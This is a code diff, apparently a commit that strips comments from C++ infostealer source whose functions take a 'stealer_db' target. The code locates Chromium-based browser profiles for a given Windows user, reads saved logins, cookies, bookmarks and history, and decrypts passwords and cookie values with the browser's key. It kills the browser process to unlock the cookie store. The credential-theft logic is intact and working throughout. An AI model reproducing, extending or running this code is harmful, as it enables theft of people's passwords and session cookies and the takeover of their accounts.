@@ -4,7 +4,7 @@ std::string chromium_paths = "AppData\\Local\\";
 std::vector<std::string> browsers_chromium = {
 	"Microsoft\\Edge\\",
 	"Google\\Chrome\\",
-	"Opera Software\\Opera Stable", //Diff, in Roaming
+	"Opera Software\\Opera Stable",
 	"Iridium\\",
 	"Chromium\\",
 	"BraveSoftware\\Brave-Browser\\",
@@ -41,15 +41,14 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 	std::string target_key_data;
 	std::string target_login_location;
 
-	// Those paths that contains '\\' at the end means they have the default file 'User Data'
-	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
+
 	for (const auto& dir : browsers_chromium) {
 
 		if (dir.back() == '\\')
 			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
 		else
 		{
-			// in case of opera, the login data is in roaming instead of local
+
 			if(dir.find("Opera") != std::string::npos)
 				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
 			else
@@ -60,7 +59,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 		target_login_data = target_user_data + "\\Default" + target_login_location;
 		target_key_data = target_user_data + "\\Local State";
 
-		// -------------- search profiles -----------------
+
 		std::vector<std::string> target_profiles = { target_login_data };
 		int browser_profile_number = 0;
 		std::string search_profile;
@@ -84,7 +83,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 				if (stmt == nullptr)
 					continue;
 
-				//Decrypt Key
+
 				ChromiumDecryptor obj;
 				if (obj.ChromiumDecryptorInit(target_key_data))
 				{
@@ -94,14 +93,14 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 
 						char* url = (char*)sqlite3_column_text(stmt, 0);
 						char* username = (char*)sqlite3_column_text(stmt, 1);
-						//char* password = (char*)sqlite3_column_text(stmt, 2);					
+
 
 						std::vector<BYTE> password;
 						const void* password_blob = sqlite3_column_blob(stmt, 2);
 						int password_blob_size = sqlite3_column_bytes(stmt, 2);
 
 						if (url != nullptr && username != nullptr && password_blob != nullptr && password_blob_size > 0) {
-							// Assign the BLOB data to the std::vector<BYTE>
+
 							password.assign((const BYTE*)password_blob, (const BYTE*)password_blob + password_blob_size);
 
 							if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
@@ -113,7 +112,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 
 							try
 							{
-								//decrypt password here
+
 								std::string decrypted_password = obj.AESDecrypter(password, dir);
 								data.get_password_manager().setPassword(decrypted_password);
 							}
@@ -125,7 +124,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 							data_list.push_back(data);
 						}
 						else {
-							// Handle the case where the password_blob is null (no data)
+
 							continue;
 						}
 					}
@@ -139,7 +138,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 			{
 				continue;
 			}
-		}		
+		}
 	}
 
 	if (data_list.size() == 0)
@@ -160,15 +159,14 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 	std::string target_cookie_data;
 	std::string target_cookies_location;
 
-	// Those paths that contains \\ at the end means they have the default file 'User Data'
-	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
+
 	for (const auto& dir : browsers_chromium) {
 
 		if (dir.back() == '\\')
 			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
 		else
 		{
-			// in case of opera, the login data is in roaming instead of local
+
 			if (dir.find("Opera") != std::string::npos)
 				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
 			else
@@ -179,7 +177,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 		target_cookie_data = target_user_data + "\\Default" + target_cookies_location;
 		target_key_data = target_user_data + "\\Local State";
 
-		// -------------- search profiles -----------------
+
 		std::vector<std::string> target_profiles = { target_cookie_data };
 		int browser_profile_number = 0;
 		std::string search_profile;
@@ -202,7 +200,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 
 				if (stmt == nullptr)
 				{
-					// cookies file is locked when chromium based browser is running
+
 					if (!kill_process(dir))
 						continue;
 
@@ -214,7 +212,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 					}
 				}
 
-				//Decrypt key
+
 				ChromiumDecryptor obj;
 				if (obj.ChromiumDecryptorInit(target_key_data))
 				{
@@ -231,7 +229,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 						char* expiry = (char*)sqlite3_column_text(stmt, 4);
 
 						if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
-							// Assign the BLOB data to the std::vector<BYTE>
+
 							cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);
 
 							if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
@@ -239,14 +237,14 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 
 							try
 							{
-								//decrypt cookies here
+
 								std::string decrypted_cookies = obj.AESDecrypter(cookies, dir);
 
 								if (decrypted_cookies.empty())
 									continue;
 
 								if (decrypted_cookies.size() > 32) {
-									decrypted_cookies.erase(0, 32);  // Remove the first 32 bytes
+									decrypted_cookies.erase(0, 32);
 								}
 
 								data.get_cookies_manager().setCookies(decrypted_cookies);
@@ -263,7 +261,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 							data_list.push_back(data);
 						}
 						else {
-							// Handle the case where the cookies_blob is null (no data)
+
 							continue;
 						}
 					}
@@ -297,25 +295,24 @@ BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db)
 	std::string target_bookmark_data;
 	std::string target_bookmark_location;
 
-	// Those paths that contains '\\' at the end means they have the default file 'User Data'
-	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
+
 	for (const auto& dir : browsers_chromium) {
 
 		if (dir.back() == '\\')
 			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
 		else
 		{
-			// in case of opera, the login data is in roaming instead of local
+
 			if (dir.find("Opera") != std::string::npos)
 				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
 			else
 				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
 		}
-		
+
 		target_bookmark_location = "\\Bookmarks";
 		target_bookmark_data = target_user_data + "\\Default" + target_bookmark_location;
 
-		// -------------- search profiles -----------------
+
 		std::vector<std::string> target_profiles = { target_bookmark_data };
 		int browser_profile_number = 0;
 		std::string search_profile;
@@ -334,15 +331,15 @@ BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db)
 			target_bookmark_data = prof;
 
 			std::filesystem::path json_path(target_bookmark_data);
-			// Check if the file exists and is a regular file
+
 			if (!std::filesystem::exists(json_path) || !std::filesystem::is_regular_file(json_path)) {
 				continue;
 			}
 
-			// Open the file using ifstream
+
 			std::ifstream file(json_path);
 			if (!file.is_open()) {
-				std::cerr << "Error Opening Bookmarks file " << std::endl;  // Print specific error message
+				std::cerr << "Error Opening Bookmarks file " << std::endl;
 				continue;
 			}
 
@@ -388,15 +385,14 @@ BOOL chromium_history_collector(std::string username, std::string stealer_db)
 	std::string target_history_data;
 	std::string target_history_location;
 
-	// Those paths that contains \\ at the end means they have the default file 'User Data'
-	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
+
 	for (const auto& dir : browsers_chromium) {
 
 		if (dir.back() == '\\')
 			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
 		else
 		{
-			// in case of opera, the login data is in roaming instead of local
+
 			if (dir.find("Opera") != std::string::npos)
 				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
 			else
@@ -406,7 +402,7 @@ BOOL chromium_history_collector(std::string username, std::string stealer_db)
 		target_history_location = "\\History";
 		target_history_data = target_user_data + "\\Default" + target_history_location;
 
-		// -------------- search profiles -----------------
+
 		std::vector<std::string> target_profiles = { target_history_data };
 		int browser_profile_number = 0;
 		std::string search_profile;
